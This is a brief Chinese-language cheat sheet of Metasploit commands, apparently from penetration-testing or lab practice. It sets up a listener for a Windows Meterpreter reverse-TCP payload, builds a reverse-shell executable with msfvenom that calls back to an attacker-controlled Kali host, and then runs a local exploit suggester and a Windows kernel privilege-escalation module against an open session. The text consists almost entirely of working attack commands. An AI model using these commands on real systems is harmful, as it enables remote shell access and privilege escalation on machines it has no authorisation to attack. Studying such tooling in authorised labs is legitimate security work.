# msf的一些用法

```python
建立连接
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost [Kali VM IP Address]
run
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe > shell.exe

内核版本漏洞利用
run post/multi/recon/local_exploit_suggester
 use exploit/windows/local/ms16_014_wmi_recv_notif
 set SESSION [meterpreter SESSION number]
 set LPORT 5555
 run
```
